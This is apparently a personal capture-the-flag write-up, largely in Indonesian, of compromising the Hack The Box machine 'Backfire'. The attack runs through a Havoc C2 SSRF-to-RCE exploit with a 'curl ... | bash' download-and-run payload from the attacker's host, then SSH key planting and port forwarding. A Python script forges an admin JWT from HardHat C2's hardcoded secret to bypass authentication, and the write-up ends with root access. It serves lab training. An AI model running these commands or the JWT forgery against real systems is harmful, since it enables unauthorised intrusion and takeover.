# 0. Reference
https://www.linkedin.com/posts/jose-francisco-flores-_owned-backfire-from-hack-the-box-activity-7286927982437269505-2-20
# 1. Active Port
## TCP
![[../../../../attachments/Pasted image 20250119205537.png]]
## UDP
![[../../../../attachments/Pasted image 20250119223214.png]]
# 2.Web
## Port 443
![[../../../../attachments/Pasted image 20250119205818.png]]
dirsearch normal -> nope
dirsearch raft medium -> nope
feroxbuster ->  nope
## Port 8000
![[../../../../attachments/Pasted image 20250119205910.png]]
disable_tls.patch => ada keterangan ==pake websocket==
![[../../../../attachments/Pasted image 20250119210215.png]]
havoc.yaotl => ==ada credential==
![[../../../../attachments/Pasted image 20250119210309.png]]
dirsearch normal -> nope
dirsearch raft medium -> nope
feroxbuster -> nope
## Subdomain
backfire.htb -> nope
backfire.htb:8000 -> nope
## Nikto
nope
## Whatweb
![[../../../../attachments/Pasted image 20250120094149.png]]
pada web port 443 memiliki header x-havoc -> kemungkinan port ini yang sebagai server havocnya
## Havoc.yaotl
file untuk havoc framework
# 3. Havoc Framework
Install havoc framework
https://havocframework.com/docs/installation
ada error saat instalasi, berdasarkan diskusi di github https://github.com/HavocFramework/Havoc/issues/516 , coba ganti dengan
![[../../../../attachments/Pasted image 20250120104022.png]]

found CVE https://github.com/HimmeL-Byte/CVE-2024-41570-SSRF-RCE & https://github.com/chebuya/Havoc-C2-SSRF-poc
![[../../../../attachments/Pasted image 20250120224501.png]]
![[../../../../attachments/Pasted image 20250120224521.png]]

==ini yang work== https://github.com/Mesumine/Havoc-Hackback/tree/main
```
python3 exploit.py -t https://backfire.htb/ -u ilya CobaltStr1keSuckz! -c 'curl http://10.10.14.83:8000/payload.sh | bash'
```
![[../../../../attachments/Pasted image 20250121111437.png]]
![[../../../../attachments/Pasted image 20250121111459.png]]
dapat user flag
# 4. Priviledge Escalation
generate ssh key, untuk akses via ssh
![[../../../../attachments/Pasted image 20250121130330.png]]
copykan public key tsb ke authorizes_keys
```
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPeW9gtkPbBVjx4EUFFB8wI8nPCZAZ5/6NAdovtLy9A0 kali@kali' >> authorized_keys
```
![[../../../../attachments/Pasted image 20250121130409.png]]
terdapat hardhat.txt
![[../../../../attachments/Pasted image 20250121130557.png]]
terdapat port 7096
port forwarder the port,
```
ssh -i id_ed25519 ilya@10.10.11.49 -L 8000:127.0.0.1:8000 -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096
```
![[../../../../attachments/Pasted image 20250121131906.png]]
groups
```
$ groups
ilya cdrom floppy audio dip video plugdev users netdev

```
![[../../../../attachments/Pasted image 20250121140749.png]]
terdapat POC eksploitasi hardhat 
https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7

## Bypass authentication
```
import jwt
import datetime
import uuid
import requests

rhost = 'localhost:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "P@ssw0rd!",
  "role": "TeamLead",
  "username": "acnsmgk"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```
![[../../../../attachments/Pasted image 20250122093704.png]]
 berhasil login dengan user yang kita buat
 ![[../../../../attachments/Pasted image 20250122094116.png]]
 pilih implant -> terminal -> masukkan ssh key kita![[../../../../attachments/Pasted image 20250122101113.png]]
berhasil dapat sergej
![[../../../../attachments/Pasted image 20250122101201.png]]
![[../../../../attachments/Pasted image 20250122101642.png]]
encript password untuk root -> kita pake "asd"
![[../../../../attachments/Pasted image 20250122132216.png]]
masukkan root password yg sudah di encrypt
![[../../../../attachments/Pasted image 20250122132719.png]]
hmm tidak bisa save ke /etc/passwd
![[../../../../attachments/Pasted image 20250122133058.png]]
coba cara lain, coba kita save ssh key kita ke .ssh nya root
![[../../../../attachments/Pasted image 20250122133412.png]]
berhasil, akses ssh
![[../../../../attachments/Pasted image 20250122133649.png]]
**PWN!**